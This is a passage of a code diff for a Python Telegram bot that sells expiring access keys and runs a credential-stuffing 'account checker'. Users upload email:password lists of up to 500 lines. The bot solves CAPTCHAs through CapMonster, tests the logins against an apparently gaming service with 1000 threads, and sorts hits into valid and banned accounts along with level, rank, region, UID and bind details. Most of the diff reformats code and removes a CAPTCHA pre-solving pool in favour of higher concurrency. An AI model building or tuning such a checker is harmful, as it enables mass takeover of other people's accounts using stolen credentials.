                 "• /help - Show help information\n\n"
-                "💡 Use the menu button (☰) to access commands quickly!"
-            )
+                "💡 Use the menu button (☰) to access commands quickly!")
         else:
             welcome_msg += (
                 "❌ You don't have access to this bot.\n"
@@ -1384,7 +1613,8 @@ class TelegramBot:
 
         await update.message.reply_text(welcome_msg)
 
-    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+    async def help_command(self, update: Update,
+                           context: ContextTypes.DEFAULT_TYPE):
         """Handle /help command."""
         user_id = update.effective_user.id
 
@@ -1397,28 +1627,26 @@ class TelegramBot:
                 "• `/listkeys` - List all active keys\n"
                 "• `/revokekey <user_id>` - Revoke a specific key\n"
                 "• `/announce <message>` - Send message to all users\n"
-                "• `/stats` - View bot statistics\n\n"
-            )
+                "• `/stats` - View bot statistics\n\n")
 
-        help_msg += (
-            "👤 **User Commands:**\n"
-            "• `/start` - Start the bot\n"
-            "• `/redeem <key>` - Redeem an access key\n"
-            "• `/mykey` - Check your key status\n"
-            "• `/apikey <key>` - Set your CapMonster API key\n"
-            "• `/balance` - Check your CapMonster balance\n"
-            "• `/check` - Start account checking (upload .txt file)\n"
-            "• `/help` - Show this help message\n\n"
-            "💡 **Tips:**\n"
-            "• Use the menu button (☰) for quick access to commands\n"
-            "• Keys automatically expire after their set duration\n"
-            "• Set your CapMonster API key before checking accounts\n"
-            "• Contact admins if you need access or have issues"
-        )
+        help_msg += ("👤 **User Commands:**\n"
+                     "• `/start` - Start the bot\n"
+                     "• `/redeem <key>` - Redeem an access key\n"
+                     "• `/mykey` - Check your key status\n"
+                     "• `/apikey <key>` - Set your CapMonster API key\n"
+                     "• `/balance` - Check your CapMonster balance\n"
+                     "• `/check` - Start account checking (upload .txt file)\n"
+                     "• `/help` - Show this help message\n\n"
+                     "💡 **Tips:**\n"
+                     "• Use the menu button (☰) for quick access to commands\n"
+                     "• Keys automatically expire after their set duration\n"
+                     "• Set your CapMonster API key before checking accounts\n"
+                     "• Contact admins if you need access or have issues")
 
         await update.message.reply_text(help_msg, parse_mode='Markdown')
 
-    async def my_key_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+    async def my_key_command(self, update: Update,
+                             context: ContextTypes.DEFAULT_TYPE):
         """Handle /mykey command to show key status."""
         user_id = update.effective_user.id
 
@@ -1428,8 +1656,7 @@ class TelegramBot:
                 "You have permanent admin access to this bot.\n"
                 "⏰ Expiration: Never\n"
                 "🔑 Status: Active (Admin)",
-                parse_mode='Markdown'
-            )
+                parse_mode='Markdown')
             return
 
         key_info = self.key_manager.get_key_info(user_id)
@@ -1439,8 +1666,7 @@ class TelegramBot:
                 "❌ **No Access Key**\n\n"
                 "You don't have an active access key for this bot.\n"
                 "🔑 Status: No Key\n"
-                "💬 Contact an administrator to get access."
-            )
+                "💬 Contact an administrator to get access.")
             return
 
         expires_at = datetime.fromisoformat(key_info['expires_at'])
@@ -1451,8 +1677,7 @@ class TelegramBot:
                 "⏰ **Key Expired**\n\n"
                 f"Your access key expired on: {expires_at.strftime('%Y-%m-%d %H:%M:%S')}\n"
                 "🔑 Status: Expired\n"
-                "💬 Contact an administrator for a new key."
-            )
+                "💬 Contact an administrator for a new key.")
             return
 
         time_remaining = expires_at - now
@@ -1465,8 +1690,7 @@ class TelegramBot:
             f"📅 Generated: {datetime.fromisoformat(key_info['created_at']).strftime('%Y-%m-%d %H:%M:%S')}\n"
             f"⏰ Expires: {expires_at.strftime('%Y-%m-%d %H:%M:%S')}\n"
             f"🔑 Status: Active\n\n"
-            f"⏳ **Time Remaining:**\n"
-        )
+            f"⏳ **Time Remaining:**\n")
 
         if days_remaining > 0:
             status_msg += f"📅 {days_remaining} days, {hours_remaining} hours"
@@ -1478,7 +1702,8 @@ class TelegramBot:
 
         await update.message.reply_text(status_msg, parse_mode='Markdown')
 
-    async def redeem_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+    async def redeem_command(self, update: Update,
+                             context: ContextTypes.DEFAULT_TYPE):
         """Handle /redeem command to redeem an access key."""
         user_id = update.effective_user.id
         user = update.effective_user
@@ -1494,8 +1719,7 @@ class TelegramBot:
                 "**Usage:** `/redeem <key-id>`\n"
                 "**Example:** `/redeem abc123def-456g-789h-012i-jklm345nop67`\n\n"
                 "💬 Contact an administrator if you need a key.",
-                parse_mode='Markdown'
-            )
+                parse_mode='Markdown')
             return
 
         key_id = context.args[0].strip()
@@ -1511,8 +1735,7 @@ class TelegramBot:
                 f"⏰ Current key expires: {expires_at.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                 "💡 Your current key will be replaced if you redeem a new one.\n"
                 "Proceeding with key redemption...",
-                parse_mode='Markdown'
-            )
+                parse_mode='Markdown')
 
         # Try to activate the key
         try:
@@ -1533,10 +1756,11 @@ class TelegramBot:
                     f"📅 Duration: {days_duration} days\n\n"
                     "🤖 You now have full access to the bot!\n"
                     "💡 Use `/help` to see available commands.",
-                    parse_mode='Markdown'
-                )
+                    parse_mode='Markdown')
 
-                logger.info(f"User {user_id} (@{user.username}) successfully redeemed key {key_id}")
+                logger.info(
+                    f"User {user_id} (@{user.username}) successfully redeemed key {key_id}"
+                )
 
             else:
                 await update.message.reply_text(
@@ -1547,27 +1771,30 @@ class TelegramBot:
                     "• Expired before activation\n\n"
                     "🔑 Please check the key and try again.\n"
                     "💬 Contact an administrator if you continue having issues.",
-                    parse_mode='Markdown'
+                    parse_mode='Markdown')
+
+                logger.warning(
+                    f"User {user_id} (@{user.username}) failed to redeem key {key_id}"
                 )
 
-                logger.warning(f"User {user_id} (@{user.username}) failed to redeem key {key_id}")
-
         except Exception as e:
-            logger.error(f"Error redeeming key {key_id} for user {user_id}: {e}")
+            logger.error(
+                f"Error redeeming key {key_id} for user {user_id}: {e}")
             await update.message.reply_text(
                 "⚠️ **Redemption Error**\n\n"
                 "An error occurred while processing your key.\n"
                 "Please try again later or contact an administrator.\n\n"
                 f"Error details: {str(e)[:100]}...",
-                parse_mode='Markdown'
-            )
+                parse_mode='Markdown')
 
-    async def generate_key_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+    async def generate_key_command(self, update: Update,
+                                   context: ContextTypes.DEFAULT_TYPE):
         """Handle /generatekey command (admin only)."""
         user_id = update.effective_user.id
 
         if not self.is_admin(user_id):
-            await update.message.reply_text("❌ This command is only available to administrators.")
+            await update.message.reply_text(
+                "❌ This command is only available to administrators.")
             return
 
         # Parse duration argument
@@ -1577,8 +1804,7 @@ class TelegramBot:
                 "Usage: `/generatekey <days>`\n"
                 "Available durations: 1, 3, or 7 days\n\n"
                 "Example: `/generatekey 7`",
-                parse_mode='Markdown'
-            )
+                parse_mode='Markdown')
             return
 
         try:
@@ -1590,8 +1816,7 @@ class TelegramBot:
                 "❌ **Invalid Duration**\n\n"
                 "Please specify 1, 3, or 7 days.\n"
                 "Example: `/generatekey 3`",
-                parse_mode='Markdown'
-            )
+                parse_mode='Markdown')
             return
 
         # Generate the key
@@ -1605,27 +1830,26 @@ class TelegramBot:
             "📋 **Instructions:**\n"
             "1. Share this key ID with the user\n"
             "2. User should use `/redeem <key>` to activate access\n"
-            "3. Key will automatically expire after the set duration"
-        )
+            "3. Key will automatically expire after the set duration")
 
         await update.message.reply_text(success_msg, parse_mode='Markdown')
         logger.info(f"Admin {user_id} generated key {key_id} for {days} days")
 
-    async def list_keys_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+    async def list_keys_command(self, update: Update,
+                                context: ContextTypes.DEFAULT_TYPE):
         """Handle /listkeys command (admin only)."""
         user_id = update.effective_user.id
 
         if not self.is_admin(user_id):
-            await update.message.reply_text("❌ This command is only available to administrators.")
+            await update.message.reply_text(
+                "❌ This command is only available to administrators.")
             return
 
         keys = self.key_manager.get_all_keys()
 
         if not keys:
-            await update.message.reply_text(
-                "📋 **Active Keys**\n\n"
-                "No active keys found."
-            )
+            await update.message.reply_text("📋 **Active Keys**\n\n"
+                                            "No active keys found.")
             return
 
         keys_msg = "📋 **Active Keys**\n\n"
@@ -1638,7 +1862,8 @@ class TelegramBot:
             # Get user info if user_id exists
             if user_id_key:
                 user_info = self.data_manager.get_user(user_id_key)
-                user_display = f"@{user_info['username']}" if user_info and user_info['username'] else f"ID: {user_id_key}"
+                user_display = f"@{user_info['username']}" if user_info and user_info[
+                    'username'] else f"ID: {user_id_key}"
             else:
                 user_display = "Not activated"
 
@@ -1649,23 +1874,23 @@ class TelegramBot:
             if key_data.get('status') == 'pending':
                 status = "⏳ Pending"
 
-            keys_msg += (
-                f"👤 {user_display}\n"
-                f"🆔 Key: {key_data['key_id'][:8]}...\n"
-                f"📅 Created: {created_at.strftime('%m/%d %H:%M')}\n"
-                f"⏰ Expires: {expires_at.strftime('%m/%d %H:%M')}\n"
-                f"🔑 Status: {status}\n"
-                f"📊 Days left: {days_remaining}\n\n"
-            )
+            keys_msg += (f"👤 {user_display}\n"
+                         f"🆔 Key: {key_data['key_id'][:8]}...\n"
+                         f"📅 Created: {created_at.strftime('%m/%d %H:%M')}\n"
+                         f"⏰ Expires: {expires_at.strftime('%m/%d %H:%M')}\n"
+                         f"🔑 Status: {status}\n"
+                         f"📊 Days left: {days_remaining}\n\n")
 
         await update.message.reply_text(keys_msg)
 
-    async def revoke_key_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+    async def revoke_key_command(self, update: Update,
+                                 context: ContextTypes.DEFAULT_TYPE):
         """Handle /revokekey command (admin only)."""
         user_id = update.effective_user.id
 
         if not self.is_admin(user_id):
-            await update.message.reply_text("❌ This command is only available to administrators.")
+            await update.message.reply_text(
+                "❌ This command is only available to administrators.")
             return
 
         if not context.args or len(context.args) != 1:
@@ -1673,37 +1898,39 @@ class TelegramBot:
                 "❌ **Invalid Usage**\n\n"
                 "Usage: `/revokekey <user_id>`\n"
                 "Example: `/revokekey 123456789`",
-                parse_mode='Markdown'
-            )
+                parse_mode='Markdown')
             return
 
         try:
             target_user_id = int(context.args[0])
         except ValueError:
-            await update.message.reply_text("❌ Invalid user ID. Please provide a numeric user ID.")
+            await update.message.reply_text(
+                "❌ Invalid user ID. Please provide a numeric user ID.")
             return
 
         if self.key_manager.revoke_key(target_user_id):
             user_info = self.data_manager.get_user(target_user_id)
-            user_display = f"@{user_info['username']}" if user_info and user_info['username'] else f"ID: {target_user_id}"
+            user_display = f"@{user_info['username']}" if user_info and user_info[
+                'username'] else f"ID: {target_user_id}"
 
             await update.message.reply_text(
                 f"✅ **Key Revoked**\n\n"
-                f"Successfully revoked access key for {user_display}"
-            )
-            logger.info(f"Admin {user_id} revoked key for user {target_user_id}")
+                f"Successfully revoked access key for {user_display}")
+            logger.info(
+                f"Admin {user_id} revoked key for user {target_user_id}")
         else:
             await update.message.reply_text(
                 f"❌ **Key Not Found**\n\n"
-                f"No active key found for user ID: {target_user_id}"
-            )
+                f"No active key found for user ID: {target_user_id}")
 
-    async def announce_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+    async def announce_command(self, update: Update,
+                               context: ContextTypes.DEFAULT_TYPE):
         """Handle /announce command (admin only)."""
         user_id = update.effective_user.id
 
         if not self.is_admin(user_id):
-            await update.message.reply_text("❌ This command is only available to administrators.")
+            await update.message.reply_text(
+                "❌ This command is only available to administrators.")
             return
 
         if not context.args:
@@ -1711,8 +1938,7 @@ class TelegramBot:
                 "❌ **Invalid Usage**\n\n"
                 "Usage: `/announce <message>`\n"
                 "Example: `/announce Server maintenance in 1 hour`",
-                parse_mode='Markdown'
-            )
+                parse_mode='Markdown')
             return
 
         message = ' '.join(context.args)
@@ -1723,73 +1949,85 @@ class TelegramBot:
         success_count = 0
         failed_count = 0
 
-        await update.message.reply_text(
-            f"📤 **Broadcasting Announcement**\n\n"
-            f"Sending to {len(users)} users...\n"
-            f"This may take a moment."
-        )
+        await update.message.reply_text(f"📤 **Broadcasting Announcement**\n\n"
+                                        f"Sending to {len(users)} users...\n"
+                                        f"This may take a moment.")
 
         for user_data in users:
             try:
                 await self.application.bot.send_message(
                     chat_id=user_data['user_id'],
                     text=announcement,
-                    parse_mode='Markdown'
-                )
+                    parse_mode='Markdown')
                 success_count += 1
                 # Rate limiting to avoid hitting Telegram limits
                 await asyncio.sleep(0.1)
 
             except TelegramError as e:
-                logger.warning(f"Failed to send announcement to user {user_data['user_id']}: {e}")
+                logger.warning(
+                    f"Failed to send announcement to user {user_data['user_id']}: {e}"
+                )
                 failed_count += 1
 
-        result_msg = (
-            f"✅ **Broadcast Complete**\n\n"
-            f"📊 Successfully sent: {success_count}\n"
-            f"❌ Failed to send: {failed_count}\n"
-            f"📈 Total users: {len(users)}"
-        )
+        result_msg = (f"✅ **Broadcast Complete**\n\n"
+                      f"📊 Successfully sent: {success_count}\n"
+                      f"❌ Failed to send: {failed_count}\n"
+                      f"📈 Total users: {len(users)}")
 
         await update.message.reply_text(result_msg, parse_mode='Markdown')
-        logger.info(f"Admin {user_id} sent announcement to {success_count}/{len(users)} users")
+        logger.info(
+            f"Admin {user_id} sent announcement to {success_count}/{len(users)} users"
+        )
 
-    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+    async def stats_command(self, update: Update,
+                            context: ContextTypes.DEFAULT_TYPE):
         """Handle /stats command (admin only)."""
         user_id = update.effective_user.id
 
         if not self.is_admin(user_id):
-            await update.message.reply_text("❌ This command is only available to administrators.")
+            await update.message.reply_text(
+                "❌ This command is only available to administrators.")
             return
 
         # Get statistics
         all_users = self.data_manager.get_all_users()
         all_keys = self.key_manager.get_all_keys()
-        active_keys = [k for k in all_keys if datetime.fromisoformat(k['expires_at']) > datetime.now()]
-        expired_keys = [k for k in all_keys if datetime.fromisoformat(k['expires_at']) <= datetime.now()]
+        active_keys = [
+            k for k in all_keys
+            if datetime.fromisoformat(k['expires_at']) > datetime.now()
+        ]
+        expired_keys = [
+            k for k in all_keys
+            if datetime.fromisoformat(k['expires_at']) <= datetime.now()
+        ]
 
-        stats_msg = (
-            "📊 **Bot Statistics**\n\n"
-            f"👥 Total Users: {len(all_users)}\n"
-            f"🔑 Total Keys Generated: {len(all_keys)}\n"
-            f"✅ Active Keys: {len(active_keys)}\n"
-            f"❌ Expired Keys: {len(expired_keys)}\n"
-            f"👑 Admins: {len(self.admin_ids)}\n\n"
-            f"📅 **Key Breakdown:**\n"
-        )
+        stats_msg = ("📊 **Bot Statistics**\n\n"
+                     f"👥 Total Users: {len(all_users)}\n"
+                     f"🔑 Total Keys Generated: {len(all_keys)}\n"
+                     f"✅ Active Keys: {len(active_keys)}\n"
+                     f"❌ Expired Keys: {len(expired_keys)}\n"
+                     f"👑 Admins: {len(self.admin_ids)}\n\n"
+                     f"📅 **Key Breakdown:**\n")
 
         # Count keys by expiration
-        expiring_soon = [k for k in active_keys if (datetime.fromisoformat(k['expires_at']) - datetime.now()).days <= 1]
-        expiring_week = [k for k in active_keys if 1 < (datetime.fromisoformat(k['expires_at']) - datetime.now()).days <= 7]
+        expiring_soon = [
+            k for k in active_keys
+            if (datetime.fromisoformat(k['expires_at']) -
+                datetime.now()).days <= 1
+        ]
+        expiring_week = [
+            k for k in active_keys
+            if 1 < (datetime.fromisoformat(k['expires_at']) -
+                    datetime.now()).days <= 7
+        ]
 
-        stats_msg += (
-            f"⚠️ Expiring in 24h: {len(expiring_soon)}\n"
-            f"📅 Expiring in 7 days: {len(expiring_week)}\n"
-        )
+        stats_msg += (f"⚠️ Expiring in 24h: {len(expiring_soon)}\n"
+                      f"📅 Expiring in 7 days: {len(expiring_week)}\n")
 
         await update.message.reply_text(stats_msg, parse_mode='Markdown')
 
-    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+    async def handle_message(self, update: Update,
+                             context: ContextTypes.DEFAULT_TYPE):
         """Handle regular text messages."""
         user_id = update.effective_user.id
 
@@ -1798,8 +2036,7 @@ class TelegramBot:
                 "❌ **Access Denied**\n\n"
                 "You don't have valid access to this bot.\n"
                 "🔑 Please contact an administrator to get an access key.\n\n"
-                "💡 Use /start to check your access status."
-            )
+                "💡 Use /start to check your access status.")
             return
 
         # Echo the message for users with valid access
@@ -1808,7 +2045,8 @@ class TelegramBot:
             f"You have valid access to this bot. Use /help for available commands."
         )
 
-    async def set_api_key_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+    async def set_api_key_command(self, update: Update,
+                                  context: ContextTypes.DEFAULT_TYPE):
         """Handle /apikey command to set CapMonster API key."""
         user_id = update.effective_user.id
 
@@ -1817,8 +2055,7 @@ class TelegramBot:
                 "❌ **Access Denied**\n\n"
                 "You need valid access to use this command.\n"
                 "🔑 Please contact an administrator to get an access key.",
-                parse_mode='Markdown'
-            )
+                parse_mode='Markdown')
             return
 
         if not context.args or len(context.args) != 1:
@@ -1827,17 +2064,16 @@ class TelegramBot:
                 "Usage: `/apikey <your_capmonster_api_key>`\n"
                 "Example: `/apikey abc123def456ghi789`\n\n"
                 "💡 Get your API key from CapMonster.cloud",
-                parse_mode='Markdown'
-            )
+                parse_mode='Markdown')
             return
 
         api_key = context.args[0].strip()
 
         # Validate the API key by checking balance
         try:
-            response = requests.post('https://api.capmonster.cloud/getBalance', 
-                                   json={"clientKey": api_key}, 
-                                   timeout=10)
+            response = requests.post('https://api.capmonster.cloud/getBalance',
+                                     json={"clientKey": api_key},
+                                     timeout=10)
             data = response.json()
 
             if data.get('errorId') == 0:
@@ -1849,26 +2085,24 @@ class TelegramBot:
                     f"💰 Current Balance: ${balance:.3f}\n"
                     f"🔑 API Key: {api_key[:8]}...\n\n"
                     f"You can now use `/check` to start checking accounts!",
-                    parse_mode='Markdown'
-                )
+                    parse_mode='Markdown')
                 logger.info(f"User {user_id} set CapMonster API key")
             else:
                 await update.message.reply_text(
                     f"❌ **Invalid API Key**\n\n"
                     f"Error: {data.get('errorDescription', 'Unknown error')}\n"
                     f"Please check your API key and try again.",
-                    parse_mode='Markdown'
-                )
+                    parse_mode='Markdown')
         except Exception as e:
             await update.message.reply_text(
                 f"⚠️ **Validation Error**\n\n"
                 f"Could not validate your API key: {str(e)}\n"
                 f"Please try again later.",
-                parse_mode='Markdown'
-            )
+                parse_mode='Markdown')
             return
 
-    async def balance_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+    async def balance_command(self, update: Update,
+                              context: ContextTypes.DEFAULT_TYPE):
         """Handle /balance command to check CapMonster balance."""
         user_id = update.effective_user.id
 
@@ -1877,8 +2111,7 @@ class TelegramBot:
                 "❌ **Access Denied**\n\n"
                 "You need valid access to use this command.\n"
                 "🔑 Please contact an administrator to get an access key.",
-                parse_mode='Markdown'
-            )
+                parse_mode='Markdown')
             return
 
         balance = self.capmonster_manager.get_balance(user_id)
@@ -1890,8 +2123,7 @@ class TelegramBot:
                     "❌ **No API Key Set**\n\n"
                     "Please set your CapMonster API key first.\n"
                     "Use: `/apikey <your_api_key>`",
-                    parse_mode='Markdown'
-                )
+                    parse_mode='Markdown')
             else:
                 await update.message.reply_text(
                     "⚠️ **Balance Check Failed**\n\n"
@@ -1899,8 +2131,7 @@ class TelegramBot:
                     "• Your API key is valid\n"
                     "• CapMonster service is available\n"
                     "• Your internet connection",
-                    parse_mode='Markdown'
-                )
+                    parse_mode='Markdown')
             return
 
         await update.message.reply_text(
@@ -1908,10 +2139,10 @@ class TelegramBot:
             f"Current Balance: ${balance:.3f}\n"
             f"Account Status: Active ✅\n\n"
             f"💡 You can use `/check` to start checking accounts!",
-            parse_mode='Markdown'
-        )
+            parse_mode='Markdown')
 
-    async def check_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+    async def check_command(self, update: Update,
+                            context: ContextTypes.DEFAULT_TYPE):
         """Handle /check command to start account checking process."""
         user_id = update.effective_user.id
 
@@ -1920,15 +2151,15 @@ class TelegramBot:
                 "❌ **Access Denied**\n\n"
                 "You need valid access to use this command.\n"
                 "🔑 Please contact an administrator to get an access key.",
-                parse_mode='Markdown'
-            )
+                parse_mode='Markdown')
             return
 
         # Check /check command cooldown (3 minutes)
         now = datetime.now()
         if user_id in self.user_last_check:
             time_since_last = now - self.user_last_check[user_id]
-            if time_since_last.total_seconds() < 180:  # 3 minutes = 180 seconds
+            if time_since_last.total_seconds(
+            ) < 180:  # 3 minutes = 180 seconds
                 remaining = 180 - time_since_last.total_seconds()
                 minutes = int(remaining // 60)
                 seconds = int(remaining % 60)
@@ -1936,8 +2167,7 @@ class TelegramBot:
                     f"⏳ **Check Command Cooldown Active**\n\n"
                     f"Please wait {minutes}m {seconds}s before using `/check` again.\n"
                     f"This prevents system overload.",
-                    parse_mode='Markdown'
-                )
+                    parse_mode='Markdown')
                 return
 
         # Check if user has CapMonster API key
@@ -1948,8 +2178,7 @@ class TelegramBot:
                 "Please set your CapMonster API key first.\n"
                 "Use: `/apikey <your_api_key>`\n\n"
                 "💡 Get your API key from CapMonster.cloud",
-                parse_mode='Markdown'
-            )
+                parse_mode='Markdown')
             return
 
         # Check balance
@@ -1960,8 +2189,7 @@ class TelegramBot:
                 "Your CapMonster balance is too low or could not be checked.\n"
                 "Please add funds to your CapMonster account.\n\n"
                 f"Current Balance: ${balance if balance else 'Unknown'}",
-                parse_mode='Markdown'
-            )
+                parse_mode='Markdown')
             return
 
         await update.message.reply_text(
@@ -1974,25 +2202,27 @@ class TelegramBot:
             "• Optimized processing for speed and stability\n\n"
             f"💰 Your balance: ${balance:.3f}\n\n"
             "📤 Upload your file now...",
-            parse_mode='Markdown'
-        )
+            parse_mode='Markdown')
 
         # Update last /check command time
         self.user_last_check[user_id] = now
 
-    async def handle_document(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+    async def handle_document(self, update: Update,
+                              context: ContextTypes.DEFAULT_TYPE):
         """Handle document uploads for account checking."""
         user_id = update.effective_user.id
 
         if not self.has_valid_key(user_id):
-            await update.message.reply_text("❌ You need valid access to upload files.")
+            await update.message.reply_text(
+                "❌ You need valid access to upload files.")
             return
 
         # Check upload cooldown (3 minutes)
         now = datetime.now()
         if user_id in self.user_last_upload:
             time_since_last = now - self.user_last_upload[user_id]
-            if time_since_last.total_seconds() < 180:  # 3 minutes = 180 seconds
+            if time_since_last.total_seconds(
+            ) < 180:  # 3 minutes = 180 seconds
                 remaining = 180 - time_since_last.total_seconds()
                 minutes = int(remaining // 60)
                 seconds = int(remaining % 60)
@@ -2000,8 +2230,7 @@ class TelegramBot:
                     f"⏳ **Upload Cooldown Active**\n\n"
                     f"Please wait {minutes}m {seconds}s before uploading another file.\n"
                     f"This prevents system overload.",
-                    parse_mode='Markdown'
-                )
+                    parse_mode='Markdown')
                 return
 
         # Check if user has CapMonster API key
@@ -2019,8 +2248,7 @@ class TelegramBot:
             await update.message.reply_text(
                 "❌ **Invalid File Type**\n\n"
                 "Please upload a .txt file only.",
-                parse_mode='Markdown'
-            )
+                parse_mode='Markdown')
             return
 
         # Check file size (max 1MB for safety)
@@ -2028,33 +2256,29 @@ class TelegramBot:
             await update.message.reply_text(
                 "❌ **File Too Large**\n\n"
                 "Please upload a file smaller than 1MB.",
-                parse_mode='Markdown'
-            )
+                parse_mode='Markdown')
             return
 
         try:
-            # Download file
+            # Ultra-fast file download and processing
             file = await context.bot.get_file(document.file_id)
             file_content = await file.download_as_bytearray()
 
-            # Parse accounts
-            content = file_content.decode('utf-8')
-            lines = [line.strip() for line in content.split('\n') if line.strip()]
-
-            accounts = []
-            for line in lines:
-                if ':' in line:
-                    parts = line.split(':', 1)
-                    if len(parts) == 2:
-                        accounts.append((parts[0].strip(), parts[1].strip()))
+            # Lightning-fast parsing with list comprehension
+            content = file_content.decode('utf-8', errors='ignore')
+            accounts = [
+                (parts[0].strip(), parts[1].strip())
+                for line in content.split('\n')
+                if line.strip() and ':' in line and len(parts := line.split(
+                    ':', 1)) == 2 and parts[0].strip() and parts[1].strip()
+            ]
 
             if len(accounts) == 0:
                 await update.message.reply_text(
                     "❌ **No Valid Accounts Found**\n\n"
                     "Please ensure your file contains accounts in the format:\n"
                     "`email:password` (one per line)",
-                    parse_mode='Markdown'
-                )
+                    parse_mode='Markdown')
                 return
 
             if len(accounts) > 500:
@@ -2062,14 +2286,13 @@ class TelegramBot:
                     f"❌ **Too Many Accounts**\n\n"
                     f"Found {len(accounts)} accounts, but the limit is 500.\n"
                     f"Please reduce your list and try again.",
-                    parse_mode='Markdown'
-                )
+                    parse_mode='Markdown')
                 return
 
-            # Update last upload time
+            # Update last upload time and start immediately
             self.user_last_upload[user_id] = now
 
-            # Start checking process
+            # Start processing instantly without delay
             await self.process_accounts(update, context, accounts, api_key)
 
         except Exception as e:
@@ -2078,76 +2301,28 @@ class TelegramBot:
                 f"⚠️ **File Processing Error**\n\n"
                 f"Could not process your file: {str(e)}\n"
                 f"Please try again with a different file.",
-                parse_mode='Markdown'
-            )
+                parse_mode='Markdown')
 
-    
-    async def process_accounts(self, update: Update, context: ContextTypes.DEFAULT_TYPE, accounts: List[Tuple[str, str]], api_key: str):
-        """Process accounts using ultra-fast batch processing with pre-solved CAPTCHAs."""
+    async def process_accounts(self, update: Update,
+                               context: ContextTypes.DEFAULT_TYPE,
+                               accounts: List[Tuple[str, str]], api_key: str):
+        """Process accounts using optimized processing with fixed 1000 threads."""
         user_id = update.effective_user.id
 
-        # Ultra-aggressive threading for maximum speed
-        if len(accounts) <= 20:
-            optimal_threads = 150
-            estimated_time = "5-10 seconds"
-        elif len(accounts) <= 50:
-            optimal_threads = 200
-            estimated_time = "10-20 seconds"
-        elif len(accounts) <= 100:
-            optimal_threads = 300
-            estimated_time = "20-35 seconds"
-        elif len(accounts) <= 200:
-            optimal_threads = 400
-            estimated_time = "35-60 seconds"
-        else:
-            optimal_threads = 500
-            estimated_time = f"{max(1, len(accounts) // 60)}-{max(2, len(accounts) // 40)} minutes"
+        # Fixed thread count for maximum performance
+        optimal_threads = 1000
+        estimated_time = f"{max(5, len(accounts) // 200)}-{max(10, len(accounts) // 100)} seconds"
 
         start_msg = await update.message.reply_text(
-            f"🚀 **Ultra-Fast Processing Started**\n\n"
+            f"⚡ **Ultra-Fast Processing Started**\n\n"
             f"📊 Total accounts: {len(accounts)}\n"
-            f"⚙️ Max threads: {optimal_threads}\n"
+            f"⚙️ Fixed threads: {optimal_threads}\n"
             f"⏱️ Estimated time: {estimated_time}\n\n"
-            f"⚡ Pre-solving CAPTCHAs for maximum speed...",
-            parse_mode='Markdown'
-        )
+            f"🚀 Starting instant processing (no pre-solving)...",
+            parse_mode='Markdown')
 
         # Initialize checker
         checker = AccountChecker(api_key)
-
-        # Pre-solve multiple CAPTCHAs in parallel for ultra-fast processing
-        captcha_tokens = []
-        captcha_lock = threading.Lock()
-
-        def solve_captcha_batch():
-            try:
-                token = checker.solve_cn31(max_retries=1)  # Single retry for speed
-                if token:
-                    with captcha_lock:
-                        captcha_tokens.append(token)
-            except:
-                pass  # Ignore failed CAPTCHA solves
-
-        # Pre-solve CAPTCHAs (aim for 1 CAPTCHA per 3-5 accounts)
-        captcha_count = max(5, min(20, len(accounts) // 4))
-
-        with ThreadPoolExecutor(max_workers=captcha_count, thread_name_prefix="CaptchaSolver") as captcha_executor:
-            captcha_futures = [captcha_executor.submit(solve_captcha_batch) for _ in range(captcha_count)]
-
-            # Wait briefly for initial CAPTCHAs
-            time.sleep(2)
-
-            # Cancel remaining CAPTCHA solving to start processing
-            for future in captcha_futures:
-                if not future.done():
-                    future.cancel()
-
-        await context.bot.edit_message_text(
-            chat_id=update.effective_chat.id,
-            message_id=start_msg.message_id,
-            text=f"⚡ **Processing {len(accounts)} accounts with {len(captcha_tokens)} pre-solved CAPTCHAs...**",
-            parse_mode='Markdown'
-        )
 
         # Thread-safe results tracking
         valid_accounts = []
@@ -2156,29 +2331,14 @@ class TelegramBot:
         processed = 0
         start_time = time.time()
         results_lock = threading.Lock()
-        captcha_index = 0
 
-        def get_next_captcha():
-            nonlocal captcha_index
-            with captcha_lock:
-                if captcha_index < len(captcha_tokens):
-                    token = captcha_tokens[captcha_index]
-                    captcha_index += 1
-                    return token
-                return None
-
-        def check_account_ultra_fast(account_data):
+        def check_account_instant(account_data):
             nonlocal processed
             email, password = account_data
 
             try:
-                # Try with pre-solved CAPTCHA first
-                existing_token = get_next_captcha()
-                if existing_token:
-                    result = checker.check_account_with_token(email, password, existing_token)
-                else:
-                    # Fallback to solving CAPTCHA (single attempt only)
-                    result = checker.check_account_simple_fast(email, password)
+                # Direct processing without pre-solved CAPTCHAs
+                result = checker.check_account_simple_fast(email, password)
 
                 with results_lock:
                     if result["status"] == "valid":
@@ -2187,7 +2347,9 @@ class TelegramBot:
                         valid_accounts.append(valid_line)
                     elif result["status"] == "banned":
                         info = result["info"]
-                        ban_info = result.get("ban_info", [{}])[0] if result.get("ban_info") else {}
+                        ban_info = result.get(
+                            "ban_info",
+                            [{}])[0] if result.get("ban_info") else {}
                         ban_reason = ban_info.get("reason", "Unknown")
                         banned_line = f"{email}:{password} | Name: {info['nn']} | Level: {info['lvl']} | Rank: {info['rank_name']} | Region: {info['reg']} | UID: {info['rid']} ({info['zid']}) | Bind: {info['bind_info']} | Banned: {ban_reason}"
                         banned_accounts.append(banned_line)
@@ -2196,32 +2358,40 @@ class TelegramBot:
 
                     processed += 1
 
-            except Exception as e:
+            except Exception:
                 with results_lock:
                     invalid_accounts.append(f"{email}:{password}")
                     processed += 1
 
-        # Ultra-fast processing with aggressive timeout
-        with ThreadPoolExecutor(max_workers=optimal_threads, thread_name_prefix="UltraFastChecker") as executor:
-            all_futures = [executor.submit(check_account_ultra_fast, account) for account in accounts]
+        # Ultra-fast processing with fixed 1000 threads
+        with ThreadPoolExecutor(
+                max_workers=optimal_threads,
+                thread_name_prefix="UltraFastChecker") as executor:
+            all_futures = [
+                executor.submit(check_account_instant, account)
+                for account in accounts
+            ]
 
